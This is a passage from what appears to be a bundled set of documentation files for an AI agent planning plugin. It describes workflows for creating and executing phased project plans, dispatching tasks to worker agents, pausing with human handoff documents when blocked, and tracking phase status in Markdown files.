Validation** - Present complete plan, ask for approval, wait\n\n### Phase 4: Task Generation\n**Goal:** Create detailed, actionable tasks\n\n**Process:**\n1. **Generate Phase Plans** - Create phases/XX-name/XX-XX-PLAN.md files\n2. **Validate Task Quality** - Each task has Scope, Action, Verify, Done\n\n## Output Structure\n\nBoth workflows create:\n```\n.cattoolkit/plan/{project-slug}/\n BRIEF.md           # Project definition\n DISCOVERY.md       # Investigation findings\n ROADMAP.md         # Phase overview\n phases/\n     01-foundation/\n        01-01-PLAN.md\n     02-core/\n        02-01-PLAN.md\n     03-enhancement/\n         03-01-PLAN.md\n```\n\n**Interactive mode additionally creates:**\n```\n QUESTIONS.md        # Clarification Q&A log\n```\n\n## Detection Algorithm\n\n```python\n# Complexity scoring (simplified)\ncomplexity_score = 0\n\n# Ambiguous tech terms (+2 each)\nif contains_any([\"framework\", \"database\", \"backend\", \"frontend\"]):\n    complexity_score += 2\n\n# Stakeholder terms (+2 each)\nif contains_any([\"team\", \"client\", \"stakeholder\", \"organization\"]):\n    complexity_score += 2\n\n# Decision keywords (+3 each)\nif contains_any([\"decide\", \"choose\", \"discuss\", \"clarify\", \"explore\"]):\n    complexity_score += 3\n\n# Complex scope (+2 each)\nif contains_any([\"platform\", \"system\", \"architecture\", \"infrastructure\"]):\n    complexity_score += 2\n\n# Route decision\nif \"--interactive\" in args or complexity_score >= 5:\n    route_to(\"interactive_workflow\")\nelse:\n    route_to(\"autonomous_workflow\")\n```\n\n## Advanced Options\n\n### Bypass Detection\nForce autonomous mode: Use `--force-autonomous` flag\n\n### Skip Discovery\nWhen you already know the codebase: Use `--skip-discovery` flag\n\n### Specify Output Directory\nCustom plan location: Use `--output-dir` flag\n",
        "plugins/sys-builder/skills/managing-plans/references/execution-workflow.md": "# Plan Execution Workflow\n\n## Core Purpose\n\nDrives execution of project phases using state-based plan management and worker agent dispatch.\n\n## State Model\n\n```markdown\n- [ ] = Pending\n- [~] = In Progress\n- [x] = Complete\n- [!] = Blocked\n```\n\n## Phase 1: Read State\n\n**Goal:** Identify what to execute\n\n**Process:**\n1. **Read ROADMAP.md**\n2. **Identify Phase**\n   - If argument provided: Use specified phase number\n   - If no argument: Find first `[ ]` (pending) phase\n   - Check dependencies are `[x]` complete\n3. **Load Phase Plan**\n4. **Check for Handoff** - Look for existing HANDOFF.md\n\n**Output:** Phase plan and execution context\n\n## Phase 2: Dispatch to Worker\n\n**Goal:** Execute tasks via worker agent\n\n**Process:**\n1. **Prepare Context**\n   ```markdown\n   BRIEF.md context\n   + ROADMAP.md state\n   + Phase plan content\n   + Current task\n   = Full execution context\n   ```\n\n2. **Spawn Worker**\n   ```bash\n   Task: @executor\n   Tools: [Read, Write, Edit, Bash, Glob, Grep]\n   Skills: [managing-plans, software-engineering, executing-tasks]\n   Constraint: NON-INTERACTIVE (no AskUserQuestion)\n   ```\n\n3. **Pass Phase Plan**\n   - Include ENTIRE phase file content\n   - Include task details\n   - Include success criteria\n   - Include verification requirements\n\n**Output:** Worker execution in progress\n\n## Phase 3: Verify Results\n\n**Goal:** Check completion and update state\n\n**Process:**\n1. **Check Worker Output**\n   - Read execution report\n   - Verify task completion\n   - Check for errors\n\n2. **If Success:**\n   - Mark phase [x] in ROADMAP.md\n   - Update task statuses\n   - Create phase summary\n   - Continue to next phase\n\n3. **If Failed:**\n   - Create HANDOFF.md using `managing-plans` template\n   - Mark phase [!] in ROADMAP.md\n   - Ask user for intervention\n   - Pause execution\n\n**Output:** Updated state and next action\n\n## Phase 4: Continue Flow\n\n**Goal:** Determine next steps\n\n**Process:**\n1. **Check Remaining Phases**\n   - Read ROADMAP.md\n   - Count pending phases\n\n2. **Ask User**\n   ```\n   Phase complete! Proceed to next phase?\n\n   Option 1: Yes, continue  I'll run /sys-builder:run-plan\n   Option 2: No, pause here  I'll stop execution\n   Option 3: Review first  I'll show phase summary\n   ```\n\n3. **If All Complete**\n   ```\n   Plan fully executed. All objectives achieved.\n\n   All phases [x] complete\n   Summary: {link to final summary}\n   ```\n\n**Output:** Next action or completion\n\n## Execution Flow Diagram\n\n```\nPhase Status: [ ]\n    \nPhase Status: [~] (executing)\n    \nPhase Status: [x] or [!]\n    \nPhase Status: [ ] (next phase) OR Plan Complete\n```\n\n## Handoff Flow\n\n```\nExecution  Error Detected\n    \nCreate HANDOFF.md\n    \nMark Phase [!]\n    \nAsk User for Intervention\n    \nUser Fixes Issue\n    \nRestart Execution\n    \nMark Phase [~]\n    \nContinue Execution\n```\n\n## Handoff Protocol\n\n**Triggered When:**\n- Authentication required (API keys, credentials)\n- Merge conflicts\n- Dependency errors\n- Critical failures\n- Ambiguous requirements\n\n**Handoff Format:**\n- Use `managing-plans` handoff template\n- Include: Reason, What Happened, Actions Required, Verification\n- Save in phase directory as `HANDOFF.md`\n\n## Verification Criteria\n\n**Phase Complete When:**\n- All tasks marked [x]\n- Execution report shows success\n- Tests passing\n- Deliverables produced\n\n**Phase Blocked When:**\n- Error encountered\n- Worker cannot proceed\n- Human intervention required\n- HANDOFF.md created\n",
        "plugins/sys-builder/skills/managing-plans/references/handoff-protocols.md": "# Handoff Protocols\n\n## Overview\n\nHandoff Protocols define how to pause, document, and resume execution when blocked by issues requiring human intervention.\n\n## Handoff Triggers\n\n### When to Create Handoff\n\n**1. Authentication Gate**\n```markdown\nType: AUTH_GATE\nTrigger: API keys, credentials, or service access required\nAction: Create handoff, pause execution\nExample: AWS credentials needed for deployment\n```\n\n**2. Dependency Missing**\n```markdown\nType: DEPENDENCY\nTrigger: External service down, library unavailable, environment not configured\nAction: Create handoff, pause execution\nExample: PostgreSQL service not running\n```\n\n**3. Conflict**\n```markdown\nType: CONFLICT\nTrigger: Merge conflicts, dependency conflicts, version conflicts\nAction: Create handoff, pause execution\nExample: Git merge conflict in critical file\n```\n\n**4. Ambiguity**\n```markdown\nType: AMBIGUOUS\nTrigger: Unclear requirements, missing information, decision needed\nAction: Create handoff, pause execution\nExample: Unclear API specification\n```\n\n**5. Critical Error**\n```markdown\nType: ERROR\nTrigger: Build failure, test failure, system error\nAction: Create handoff, pause execution\nExample: Production build repeatedly failing\n```\n\n**6. External Decision**\n```markdown\nType: DECISION\nTrigger: Business decision required, stakeholder input needed\nAction: Create handoff, pause execution\nExample: Feature scope change needed\n```\n\n## Handoff Document Structure\n\n### Standard Handoff Format\n\n**Using Managing-Project-Plans Template:**\n\n```markdown\n# HANDOFF Required\n\n**Reason:** {AUTH_GATE | CONFLICT | AMBIGUOUS | DEPENDENCY | ERROR | DECISION}\n\n**Date:** {YYYY-MM-DD}\n**Phase:** {XX - phase-name}\n**Task:** {task-name}\n\n## What Happened\n{Detailed description of the blocker or issue}\n\n## Current State\n- **Completed Tasks:**\n  - [x] {Task 1} - {completion details}\n  - [x] {Task 2} - {completion details}\n\n- **In Progress:**\n  - [~] {Task N} - {current status}\n\n- **Blocked On:**\n  - {Specific blocker or issue}\n\n## What You Need to Do\n1. {Action 1 - specific and actionable}\n2. {Action 2 - specific and actionable}\n3. {Action 3 - specific and actionable}\n\n## Verification\n{How to confirm the fix has been applied}\n- Command to run: `{command}`\n- Expected result: {result}\n- Alternative check: {alternative verification}\n\n## Next Steps\nAfter resolving the issue:\n1. Restart execution\n2. Verify the blocker is resolved\n3. Continue with remaining tasks\n\n## Context\n{Additional context that might be helpful}\n- Previous attempts: {what was tried}\n- Error messages: {relevant error output}\n- Related issues: {links or references}\n\n## Attachments\n- Log files: {path}\n- Screenshots: {path}\n- Error reports: {path}\n```\n\n## Handoff Examples\n\n### Example 1: Authentication Gate\n\n```markdown\n# HANDOFF Required\n\n**Reason:** AUTH_GATE\n\n**Date:** 2026-01-12\n**Phase:** 02 - Core Features\n**Task:** Deploy to staging environment\n\n## What Happened\nDeployment failed due to missing AWS credentials. The deployment script requires AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY to push Docker images to ECR.\n\n## Current State\n- **Completed Tasks:**\n  - [x] Task 1: Setup Docker configuration\n  - [x] Task 2: Create deployment scripts\n\n- **In Progress:**\n  - [~] Task 3: Deploy to staging (BLOCKED)\n\n- **Blocked On:**\n  - AWS credentials not configured\n\n## What You Need to Do\n1. Provide AWS_ACCESS_KEY_ID\n2. Provide AWS_SECRET_ACCESS_KEY\n3. Confirm ECR repository exists: `thecattoolkit-staging`\n\n## Verification\nRun: `aws sts get-caller-identity`\nExpected: Should return your AWS account info without errors\n\n## Next Steps\nAfter resolving the issue:\n1. Restart execution\n2. Verify AWS credentials work\n3. Continue with deployment task\n\n## Context\n- Deployment target: AWS ECR + ECS\n- Region: us-east-1\n- Repository: thecattoolkit-staging\n- No sensitive data in logs\n```\n\n### Example 2: Merge Conflict\n\n```markdown\n# HANDOFF Required\n\n**Reason:** CONFLICT\n\n**Date:** 2026-01-12\n**Phase:** 03 - Enhancement\n**Task:** Add user dashboard\n\n## What Happened\nGit merge conflict detected in `src/components/Dashboard.js`. Two branches modified the same file with conflicting changes.\n\n## Current State\n- **Completed Tasks:**\n  - [x] Task 1: Create dashboard layout\n  - [x] Task 2: Add data fetching logic\n\n- **In Progress:**\n  - [~] Task 3: Merge dashboard changes (BLOCKED)\n\n- **Blocked On:**\n  - Merge conflict in src/components/Dashboard.js\n\n## What You Need to Do\n1. Resolve merge conflict in src/components/Dashboard.js\n2. Choose which version to keep or merge both\n3. Test the merged version\n4. Commit the resolved changes\n\n## Verification\nRun: `git status`\nExpected: No unmerged paths, clean working tree\n\nRun: `npm test -- Dashboard.test.js`\nExpected: All tests pass\n\n## Next Steps\nAfter resolving the issue:\n1. Restart execution\n2. Verify tests pass\n3. Continue with remaining dashboard tasks\n\n## Context\n- Conflict file: src/components/Dashboard.js\n- Both branches added different features:\n  - Branch A: Added filtering\n  - Branch B: Added pagination\n- Need to preserve both features if possible\n- Tests already written for both features\n```\n\n### Example 3: Dependency Issue\n\n```markdown\n# HANDOFF Required\n\n**Reason:** DEPENDENCY\n\n**Date:** 2026-01-12\n**Phase:** 01 - Foundation\n**Task:** Install dependencies\n\n## What Happened\nPackage installation failed due to version conflict between dependencies. `package-lock.json` has conflicting requirements for `react-router-dom`.\n\n## Current State\n- **Completed Tasks:**\n  - [x] Task 1: Setup project structure\n\n- **In Progress:**\n  - [~] Task 2: Install dependencies (BLOCKED)\n\n- **Blocked On:**\n  - npm install failing with dependency conflict\n\n## What You Need to Do\n1. Review dependency conflicts in package.json\n2. Choose versions that are compatible\n3. Update package.json if necessary\n4. Run `npm install` again\n\n## Verification\nRun: `npm install`\nExpected: Installation completes without errors\n\nRun: `npm ls react-router-dom`\nExpected: Shows single version installed\n\n## Next Steps\nAfter resolving the issue:\n1. Restart execution\n2. Verify all dependencies installed\n3. Continue with project setup\n\n## Context\n- Conflicting packages: react-router-dom v6.10.0 vs v6.8.0\n- Root cause: One dependency requires older version\n- Recommended: Upgrade older dependency or pin react-router-dom\n```\n\n### Example 4: Ambiguous Requirements\n\n```markdown\n# HANDOFF Required\n\n**Reason:** AMBIGUOUS\n\n**Date:** 2026-01-12\n**Phase:** 02 - Core Features\n**Task:** Implement user authentication\n\n## What Happened\nUnclear requirements for authentication flow. Multiple authentication methods mentioned but no clear specification of which to implement first or what the complete flow should look like.\n\n## Current State\n- **Completed Tasks:**\n  - [x] Task 1: Setup user database schema\n\n- **In Progress:**\n  - [~] Task 2: Implement authentication (BLOCKED)\n\n- **Blocked On:**\n  - Unclear authentication requirements\n\n## What You Need to Do\n1. Clarify authentication methods to implement (email/password, OAuth, SSO, etc.)\n2. Define complete authentication flow (login, register, logout, password reset)\n3. Specify which features are in-scope for this phase\n4. Approve authentication approach\n\n## Verification\nReview requirements document and confirm:\n- Authentication methods specified GOOD\n- Complete flow documented GOOD\n- In-scope features defined GOOD\n- Design approved GOOD\n\n## Next Steps\nAfter clarification:\n1. Restart execution\n2. Implement authentication as specified\n3. Continue with authorization tasks\n\n## Context\n- User mentioned: \"Need authentication\" and \"Should support OAuth\"\n- Questions: Which OAuth providers? Email/password also? Multi-factor?\n- Related: User management system being built\n- Timeline: Authentication needed for Phase 3 features\n```\n\n## Handoff Lifecycle\n\n### Phase 1: Detection\n\n**Identify Blocker:**\n```markdown\n1. Task execution fails\n2. Error detected\n3. Automatic recovery attempted\n4. Recovery fails\n5. Blocker classified\n```\n\n### Phase 2: Documentation\n\n**Create Handoff:**\n```markdown\n1. Use managing-project-plans handoff template\n2. Fill all required sections\n3. Include relevant context\n4. Provide clear action items\n5. Add verification steps\n```\n\n### Phase 3: State Update\n\n**Update Status:**\n```markdown\n1. Update phase status [~]  [!]\n2. Save execution state\n3. Mark blocked task\n4. Document handoff location\n```\n\n### Phase 4: Resolution\n\n**User Action:**\n```markdown\n1. Review handoff document\n2. Perform required actions\n3. Verify resolution\n4. Confirm ready to resume\n```\n\n### Phase 5: Resume\n\n**Restart Execution:**\n```markdown\n1. Verify handoff resolved\n2. Update phase status [!]  [~]\n3. Load saved state\n4. Continue task execution\n5. Monitor for progress\n```\n\n## Handoff Management\n\n### Tracking Handoffs\n\n**Handoff Registry:**\n\n```markdown\n# Handoff Registry\n\n## Active Handoffs\n\n| ID | Phase | Task | Reason | Date | Status |\n|----|-------|------|--------|------|--------|\n| H001 | 02-Core | 03-Deploy | AUTH_GATE | 2026-01-12 | Open |\n| H002 | 03-Enh | 01-Dashboard | CONFLICT | 2026-01-12 | Open |\n\n## Resolved Handoffs\n\n| ID | Phase | Task | Reason | Date | Resolved |\n|----|-------|------|--------|------|----------|\n| H000 | 01-Found | 02-Deps | DEPENDENCY | 2026-01-11 | 2026-01-11 |\n```\n\n### Handoff Quality Checklist\n\n**Before Creating Handoff:**\n- [ ] Blocker clearly identified\n- [ ] Classification correct (AUTH_GATE, CONFLICT, etc.)\n- [ ] All context included\n- [ ] Actions specific and actionable\n- [ ] Verification steps clear\n- [ ] Template fully filled\n\n**Before Resuming:**\n- [ ] All actions completed\n- [ ] Verification commands run\n- [ ] Expected results confirmed\n- [ ] Ready to continue\n- [ ] State restored\n\n## Best Practices\n\n### Writing Effective Handoffs\n\n**DO:**\n- GOOD Be specific about the issue\n- GOOD Provide clear action items\n- GOOD Include relevant context\n- GOOD Add verification steps\n- GOOD Use template consistently\n- GOOD Keep it professional\n\n**DON'T:**\n- BAD Blame or criticize\n- BAD Include sensitive data\n- BAD Be vague or ambiguous\n- BAD Forget to include context\n- BAD Skip verification steps\n- BAD Leave actions unclear\n\n### Common Mistakes\n\n**Mistake 1: Vague Actions**\n```markdown\nBAD \"Fix the issue\"\nGOOD \"Update package.json to use react-router-dom v6.10.0\"\n```\n\n**Mistake 2: Missing Context**\n```markdown\nBAD \"Build failed\"\nGOOD \"Production build failed with error: 'Module not found: Error: Cannot resolve './utils'\"\nGOOD \"File: src/utils/auth.js was deleted in commit abc123\"\nGOOD \"Context: Refactoring authentication module\"\n```\n\n**Mistake 3: No Verification**\n```markdown\nBAD \"AWS credentials configured\"\nGOOD \"Run 'aws sts get-caller-identity' and verify no errors\"\n```\n\n## Quick Reference\n\n### Handoff Checklist\n\n**Creating Handoff:**\n- [ ] Identify blocker type\n- [ ] Use handoff template\n- [ ] Fill all sections\n- [ ] Include relevant logs\n- [ ] Provide specific actions\n- [ ] Add verification steps\n- [ ] Update phase status\n- [ ] Save execution state\n\n**Resolving Handoff:**\n- [ ] Review handoff document\n- [ ] Perform required actions\n- [ ] Run verification commands\n- [ ] Confirm expected results\n- [ ] Update handoff registry\n- [ ] Notify execution to resume\n\n### Handoff Types\n\n```markdown\nAUTH_GATE    - Credentials/API keys needed\nCONFLICT     - Merge or dependency conflicts\nAMBIGUOUS    - Unclear requirements\nDEPENDENCY   - Missing external service\nERROR        - Critical errors\nDECISION     - Business decision needed\n```\n\n### Handoff Status Codes\n\n```markdown\n[~] - In Progress (executing)\n[!] - Blocked (handoff created)\n[x] - Complete (finished successfully)\n```\n\n## Execution Orchestration Protocols\n\n### Worker Agent Orchestration\n\n**Protocol:**\n\n1. **Prepare Context**\n   ```markdown\n   Phase plan content\n   + BRIEF.md context\n   + Current state\n   = Full execution context\n   ```\n\n2. **Dispatch to Worker**\n   ```markdown\n   Task: {Full context}\n   Agent: Worker\n   Constraint: Non-interactive execution\n   Tools: [Read, Write, Edit, Bash, Glob, Grep]\n   Skills: [managing-project-plans, software-engineering, execution-core]\n   ```\n\n3. **Monitor Execution**\n   - Check for completion\n   - Monitor for errors\n   - Detect handoff creation\n   - Verify state updates\n\n4. **Handle Completion**\n   - Read execution report\n   - Verify task completion\n   - Update state\n   - Continue or pause\n\n### Task Execution Loop\n\n**For Each Task:**\n\n```markdown\nStep 1: Execute\n- Dispatch to worker\n- Pass full context\n- Monitor execution\n\nStep 2: Verify\n- Check execution report\n- Run verification commands\n- Confirm success criteria\n\nStep 3: Update State\n- Mark task [x] complete\n- Update progress metrics\n- Check phase completion\n\nStep 4: Continue\n- Next task OR\n- Phase complete OR\n- Handoff required\n```\n\n### Execution Monitoring\n\n**Progress Tracking:**\n\n**Phase Progress:**\n```markdown\nPhase: {name} [~]\nProgress: {X}/{Y} tasks complete\n\nCompleted:\n- [x] Task 1 (completed at {time})\n- [x] Task 2 (completed at {time})\n\nIn Progress:\n- [~] Task 3 (started at {time})\n\nRemaining:\n- [ ] Task 4\n- [ ] Task 5\n```\n\n### Recovery Commands\n\n```bash\n# Verify Git state\ngit status\ngit log --oneline -5\n\n# Verify dependencies\nnpm install\nnpm ls\n\n# Verify AWS credentials\naws sts get-caller-identity\n\n# Verify service status\ncurl http://localhost:5432\n```\n",
        "plugins/sys-builder/skills/managing-plans/references/modification-workflow.md": "# Plan Modification Protocol\n\n## Core Purpose\n\nUpdates or modifies existing plans in `.cattoolkit/plan/`. Does NOT execute codeonly modifies plan files.\n\n## Phase 1: Parse Request\n\n**Goal:** Understand what to modify\n\n**Process:**\n1. **Parse Arguments**\n   - Extract action from user request\n   - Identify target (phase, task, plan)\n   - Determine modification type\n\n2. **Validate Request**\n   - Check if plan exists\n   - Verify target is valid\n   - Confirm permissions\n\n3. **Load Plan Files**\n   - Read ROADMAP.md\n   - Read BRIEF.md\n   - Read phase plan files\n\n**Output:** Request parsed and validated\n\n## Phase 2: Modify Plan\n\n**Goal:** Apply requested changes\n\n**Process:**\n1. **Update Files**\n   - Modify ROADMAP.md (if needed)\n   - Update phase plans (if needed)\n   - Adjust BRIEF.md (if needed)\n\n2. **Validate Changes**\n   - Check file structure\n   - Verify status codes\n   - Confirm dependencies\n\n3. **Save Changes**\n   - Write updated files\n   - Maintain formatting\n   - Update timestamps\n\n**Output:** Plan files modified\n\n## Phase 3: Report Changes\n\n**Goal:** Show what was modified\n\n**Process:**\n1. **Summarize Changes**\n   - List files modified\n   - Show status updates\n   - Highlight important changes\n\n2. **Show Current State**\n   - Display updated status\n   - Show progress metrics\n   - Note next steps\n\n3. **Suggest Actions**\n   - Recommend next commands\n   - Note dependencies\n   - Warn about issues\n\n**Output:** Change report and suggestions\n\n## Common Operations\n\n### View Status\n**Commands:** \"show current status\", \"display roadmap\", \"view progress\"\n\n**Displays:**\n- ROADMAP.md contents\n- Phase status table\n- Progress metrics\n- Active phase\n- Blocked phases (if any)\n\n### Update Progress\n\n**Mark Tasks Complete:** \"mark task 1 in phase 2 as complete\", \"complete phase 1\"\n\n**Mark Phases Complete:** \"mark phase 1 complete\", \"complete phase 2\"\n\n**Update Status:** \"mark phase 2 as in progress\", \"set phase 3 to blocked\"\n\n### Modify Structure\n\n**Add Phases:** \"add new phase after phase 2\", \"insert phase 3 before phase 4\"\n\n**Split Tasks:** \"split task 2 in phase 1 into 2 tasks\", \"break down task 3 into subtasks\"\n\n**Update Dependencies:** \"add dependency phase 3 on phase 2\", \"remove dependency\"\n\n### Resume Work\n\n**From Handoff:** \"resume from phase 2\", \"continue after handoff\", \"restart phase 3\"\n\n**From Interruption:** \"resume from task 2 phase 3\", \"continue execution\"\n\n### Modify Content\n\n**Update BRIEF:** \"update project objective\", \"add new constraint to brief\", \"modify success criteria\"\n\n**Edit Tasks:** \"edit task 1 in phase 2\", \"update task description\", \"change task scope\"\n\n## File Modifications\n\n**Only modifies these files:**\n- `ROADMAP.md` - Phase status and dependencies\n- `BRIEF.md` - Project goals and requirements\n- `phases/*/*.md` - Task lists and status\n- `phases/*/SUMMARY.md` - Phase summaries\n- `phases/*/HANDOFF.md` - Interruption state\n\n**Never modifies:**\n- Source code files\n- Configuration files\n- Build scripts\n- Documentation outside `.cattoolkit/plan/`\n\n## Status Codes\n\n**Valid Transitions:**\n- `[ ]`  `[~]` (start phase)\n- `[~]`  `[x]` (complete phase)\n- `[~]`  `[!]` (block phase)\n- `[!]`  `[~]` (resume phase)\n\n**Task Status:** Same as phase status. Tasks inherit phase status.\n\n## Modification Types\n\n### Status Updates\n```\n\"mark phase 1 as complete\"\n\"complete task 2\"\n\"set task 3 to done\"\n\n\"start phase 2\"\n\"mark task 1 as in progress\"\n\n\"block phase 3\"\n\"pause task 2\"\n```\n\n### Structural Changes\n```\n# Add\n\"add phase after 2\"\n\"insert new task in phase 1\"\n\"add dependency phase 3 on phase 2\"\n\n# Remove\n\"remove phase 4\"\n\"delete task 2 from phase 1\"\n\"remove dependency phase 3\"\n\n# Modify\n\"edit task 1 description\"\n\"update phase 2 name\"\n\"change task scope\"\n```\n\n### Navigation\n```\n# View\n\"show status\"\n\"display roadmap\"\n\"view progress\"\n\"list phases\"\n\n# Resume\n\"resume from phase 2\"\n\"continue after handoff\"\n\"restart phase 3\"\n```\n\n## Validation Rules\n\n**Before Modification:**\n- Plan directory must exist\n- Target phase/task must exist\n- Status transitions must be valid\n- Dependencies must be maintained\n\n**After Modification:**\n- ROADMAP.md structure valid\n- Status codes correct\n- Dependencies consistent\n- Files properly formatted\n",
        "plugins/sys-builder/skills/managing-plans/references/state-management.md": "# State Management\n\n## Overview\n\nState Management in executing-project-plans handles the lifecycle of plan execution, from initiation to completion.\n\n## State Model\n\n### Hierarchical State Structure\n\n```\nPlan State (ROADMAP.md)\n Phase 01 State\n    Task 1 State\n    Task 2 State\n    Task N State\n Phase 02 State\n Phase N State\n```\n\n### State Codes\n\n**Global State (Phases):**\n- `[ ]` = Pending - Not started, waiting for dependencies\n- `[~]` = In Progress - Currently executing\n- `[x]` = Complete - Finished successfully\n- `[!]` = Blocked - Needs intervention\n\n**Task State:**\n- `[ ]` = Pending - Not started\n- `[~]` = In Progress - Currently executing\n- `[x]` = Complete - Finished successfully\n- `[!]` = Blocked - Needs intervention\n\n## State Transitions\n\n### Valid Transitions\n\n#### Phase Transitions\n\n```mermaid\ngraph TD\n    A[Pending [ ]] --> B[In Progress [~]]\n    B --> C[Complete [x]]\n    B --> D[Blocked [!]]\n    D --> B\n```\n\n**Rules:**\n- `[ ]`  `[~]`: Start phase when dependencies complete\n- `[~]`  `[x]`: Complete phase when all tasks finish\n- `[~]`  `[!]`: Block when handoff required\n- `[!]`  `[~]`: Resume after handoff resolved\n\n#### Task Transitions\n\n```mermaid\ngraph TD\n    A[Pending [ ]] --> B[In Progress [~]]\n    B --> C[Complete [x]]\n    B --> D[Blocked [!]]\n    D --> B\n```\n\n**Rules:**\n- `[ ]`  `[~]`: Start task\n- `[~]`  `[x]`: Complete task successfully\n- `[~]`  `[!]`: Block when handoff required\n- `[!]`  `[~]`: Resume after handoff resolved\n\n### Invalid Transitions\n\n**Cannot:**\n- `[ ]`  `[x]` (skip without execution)\n- `[x]`  `[~]` (reopen completed phase)\n- `[~]`  `[~]` (already in progress)\n- `[!]`  `[x]` (complete without resolving block)\n\n## State Management Operations\n\n### Operation 1: Start Phase\n\n**Preconditions:**\n- Phase status is `[ ]`\n- All dependencies are `[x]`\n- Phase plan file exists\n\n**Steps:**\n```markdown\n1. Read ROADMAP.md\n2. Verify dependencies\n3. Update phase status [ ]  [~]\n4. Read phase plan file\n5. Prepare execution context\n6. Begin task execution\n```\n\n**Implementation:**\n```python\ndef start_phase(phase_id):\n    \"\"\"Start executing a phase\"\"\"\n\n    # Load ROADMAP\n    roadmap = read_roadmap()\n\n    # Verify phase exists and pending\n    phase = roadmap.get_phase(phase_id)\n    assert phase.status == '[ ]', f\"Phase {phase_id} not pending\"\n\n    # Verify dependencies\n    for dep in phase.dependencies:\n        dep_phase = roadmap.get_phase(dep)\n        assert dep_phase.status == '[x]', f\"Dependency {dep} not complete\"\n\n    # Update status\n    phase.status = '[~]'\n    write_roadmap(roadmap)\n\n    # Prepare context\n    context = prepare_phase_context(phase_id)\n\n    return context\n```\n\n### Operation 2: Complete Task\n\n**Preconditions:**\n- Task status is `[~]`\n- Task execution completed\n- Verification passed\n\n**Steps:**\n```markdown\n1. Read execution report\n2. Verify task completion\n3. Update task status [~]  [x]\n4. Check if phase complete\n5. If complete: Mark phase [x] and create summary\n6. If incomplete: Continue to next task\n```\n\n**Implementation:**\n```python\ndef complete_task(phase_id, task_id, execution_report):\n    \"\"\"Mark task as complete\"\"\"\n\n    # Verify completion\n    verify_task_completion(task_id, execution_report)\n\n    # Update task status\n    phase_plan = read_phase_plan(phase_id)\n    task = phase_plan.get_task(task_id)\n    task.status = '[x]'\n    write_phase_plan(phase_plan, phase_id)\n\n    # Check if phase complete\n    if phase_plan.all_tasks_complete():\n        complete_phase(phase_id)\n\n    return True\n```\n\n### Operation 3: Block Phase\n\n**Preconditions:**\n- Phase status is `[~]`\n- Blocker identified\n- Handoff document created\n\n**Steps:**\n```markdown\n1. Identify blocker\n2. Create HANDOFF.md (using managing-project-plans template)\n3. Update phase status [~]  [!]\n4. Save execution state\n5. Pause execution\n```\n\n**Implementation:**\n```python\ndef block_phase(phase_id, blocker_type, description):\n    \"\"\"Create handoff and block phase\"\"\"\n\n    # Create handoff document\n    handoff = create_handoff(\n        phase_id=phase_id,\n        blocker_type=blocker_type,\n        description=description\n    )\n\n    # Update phase status\n    roadmap = read_roadmap()\n    phase = roadmap.get_phase(phase_id)\n    phase.status = '[!]'\n    write_roadmap(roadmap)\n\n    # Save state for resume\n    save_execution_state(phase_id)\n\n    return handoff\n```\n\n### Operation 4: Resume Phase\n\n**Preconditions:**\n- Phase status is `[!]`\n- Handoff resolved\n- User confirms resume\n\n**Steps:**\n```markdown\n1. Verify handoff resolved\n2. Read saved execution state\n3. Update phase status [!]  [~]\n4. Continue execution\n```\n\n**Implementation:**\n```python\ndef resume_phase(phase_id):\n    \"\"\"Resume blocked phase\"\"\"\n\n    # Verify handoff resolved\n    assert verify_handoff_resolved(phase_id), \"Handoff not resolved\"\n\n    # Load saved state\n    state = load_execution_state(phase_id)\n\n    # Update status\n    roadmap = read_roadmap()\n    phase = roadmap.get_phase(phase_id)\n    phase.status = '[~]'\n    write_roadmap(roadmap)\n\n    # Continue execution\n    return state\n```\n\n## State Persistence\n\n### Persistence Strategy\n\n**File-Based State:**\n\n```\n.cattoolkit/plan/{project-slug}/\n BRIEF.md          # Project definition (static)\n ROADMAP.md        # Phase states (changes frequently)\n DISCOVERY.md      # Discovery findings (static)\n phases/\n    01-setup/\n       01-01-PLAN.md  # Task states (changes frequently)\n       HANDOFF.md     # Created when blocked (temporary)\n       SUMMARY.md     # Created when complete (static)\n```\n\n**State Snapshot:**\n\n```python\ndef save_execution_state(phase_id):\n    \"\"\"Save current execution state\"\"\"\n\n    state = {\n        'phase_id': phase_id,\n        'timestamp': datetime.now().isoformat(),\n        'completed_tasks': get_completed_tasks(phase_id),\n        'in_progress_task': get_in_progress_task(phase_id),\n        'execution_context': get_execution_context(phase_id)\n    }\n\n    state_file = f\"phases/{phase_id}/STATE.json\"\n    write_json(state_file, state)\n\n    return state\n```\n\n### Recovery Protocol\n\n**After Interruption:**\n\n```markdown\n1. Check for incomplete phases\n2. Load saved state\n3. Verify handoff status\n4. Resume or recreate context\n5. Continue execution\n```\n\n**Implementation:**\n```python\ndef recover_execution(plan_dir):\n    \"\"\"Recover from interruption\"\"\"\n\n    # Check ROADMAP.md\n    roadmap = read_roadmap(plan_dir)\n\n    # Find in-progress phases\n    in_progress = roadmap.get_in_progress_phases()\n\n    for phase in in_progress:\n        # Load state\n        state = load_execution_state(phase.id)\n\n        # Check handoff\n        if phase.status == '[!]':\n            # Wait for handoff resolution\n            continue\n\n        # Resume phase\n        resume_phase(phase.id)\n\n    return in_progress\n```\n\n## State Validation\n\n### Validation Rules\n\n**1. Consistency Check**\n```markdown\nRule: Task completion implies phase completion\nCheck: If all tasks [x], phase must be [x]\n```\n\n**2. Dependency Check**\n```markdown\nRule: Phase N depends on N-1 being [x]\nCheck: Cannot start phase if dependencies not [x]\n```\n\n**3. Handoff Check**\n```markdown\nRule: Handoff file exists iff phase is [!]\nCheck: [status] implies existence of HANDOFF.md\n```\n\n### Validation Implementation\n\n```python\ndef validate_plan_state(plan_dir):\n    \"\"\"Validate plan state consistency\"\"\"\n\n    roadmap = read_roadmap(plan_dir)\n\n    # Check 1: Task-Phase consistency\n    for phase in roadmap.phases:\n        phase_plan = read_phase_plan(phase.id)\n        if phase_plan.all_tasks_complete():\n            assert phase.status == '[x]', \\\n                f\"Phase {phase.id} complete but status is {phase.status}\"\n\n    # Check 2: Dependency consistency\n    for phase in roadmap.phases:\n        for dep in phase.dependencies:\n            dep_phase = roadmap.get_phase(dep)\n            assert dep_phase.status == '[x]', \\\n                f\"Phase {phase.id} depends on incomplete {dep}\"\n\n    # Check 3: Handoff consistency\n    for phase in roadmap.phases:\n        handoff_path = f\"phases/{phase.id}/HANDOFF.md\"\n        if phase.status == '[!]':\n            assert os.path.exists(handoff_path), \\\n                f\"Phase {phase.id} blocked but no HANDOFF.md\"\n\n    return True\n```\n\n## State Visualization\n\n### Progress Dashboard\n\n**ROADMAP.md as Dashboard:**\n\n```markdown\n# Roadmap: {project-name}\n\n## Phases\n\n| Phase | Name | Status | 